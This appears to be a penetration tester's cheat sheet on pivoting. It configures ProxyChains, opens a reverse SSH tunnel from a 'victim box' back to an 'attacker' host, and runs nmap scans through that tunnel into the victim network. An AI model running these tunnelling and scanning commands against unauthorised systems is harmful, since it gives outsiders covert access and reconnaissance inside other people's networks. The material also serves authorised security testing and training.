# Pivoting

### ProxyChains

#### Greater than OpenSSH 7.6

##### On Attacker Box

Open /etc/proxychains4.conf. 

Comment strictchain and uncomment dynamicchain. Comment proxydns. Uncomment quietmode. Then change the default config at the bottom from socks4 127.0.0.1 9080 to socks5 and whatever port you want to use.

Note: For RDP, make sure xclip is installed.

##### Make sure that SSH is listening on Attacker Box

```
Sudo systemctl start ssh.service                                                                                  
```

##### On Victim Box

```
sudo ssh -N -f -R 127.0.0.1:9080 user@attacker -p diff_port                                                                                                  
```
##### On Attacker Box

```
Sudo proxychains -q nmap --top-ports=20 -sT -sV -sC  -v --open  -Pn IP_Address
Sudo proxychains -q nmap -iL scope -F -sT -v --open -Pn | tee fast_scan
```
